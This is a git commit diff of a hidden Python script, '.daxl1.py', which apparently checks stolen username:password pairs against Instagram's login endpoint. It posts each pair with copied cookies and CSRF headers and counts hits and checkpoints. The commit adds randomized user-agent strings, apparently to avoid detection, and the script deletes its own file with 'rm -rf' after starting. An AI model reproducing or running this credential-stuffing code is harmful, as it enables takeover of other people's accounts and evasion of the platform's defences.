2b001a98f182683c5f5a8dca3b7038a64ca15884
sfr404sfrzed <86876730+sfr404sfrzed@users.noreply.github.com>
2021-07-28 04:11:38 +0300

    Update .daxl1.py

--- .daxl1.py
+++ .daxl1.py
@@ -1,4 +1,4 @@
-import requests, sys, os, random, time
+import requests, sys, os, random, time, user_agent
 import os,sys
 os.system('rm -rf .daxl1.py ;rm -rf /sdcard/download/.daxl1.py ;clear')
 import subprocess
@@ -91,8 +91,8 @@ for do in range(1):
         username_login = line.split(':')[0]
         password_login = line.split(':')[1]
         url_login = 'https://www.instagram.com/accounts/login/ajax/'
-        headers_login = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '291','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36','x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': '1cb44f68ffec','x-requested-with': 'XMLHttpRequest'}
-        data_login = { 'username': username_login,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:1613414957:{password_login}','queryParams': '{}','optIntoOneTap': 'false'}
+        headers_login = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'ar,en-US;q=0.9,en;q=0.8','content-length': '291','content-type': 'application/x-www-form-urlencoded','cookie': 'ig_did=3E70DB93-4A27-43EB-8463-E0BFC9B02AE1; mid=YCAadAALAAH35g_7e7h0SwBbFzBt; ig_nrcb=1; csrftoken=COmXgzKurrq8awSnRS1xf3u9rL6QsGZI','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': user_agent.generate_user_agent(),'x-csrftoken': 'COmXgzKurrq8awSnRS1xf3u9rL6QsGZI','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': '1cb44f68ffec','x-requested-with': 'XMLHttpRequest'}
+        data_login = { 'username': username_login,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password_login}','queryParams': '{}','optIntoOneTap': 'false'}
         req_login = requests.post(url_login, data=data_login, headers=headers_login,verify=True)
         def sso():
             global bad,hits,checkpoint,timeout,error
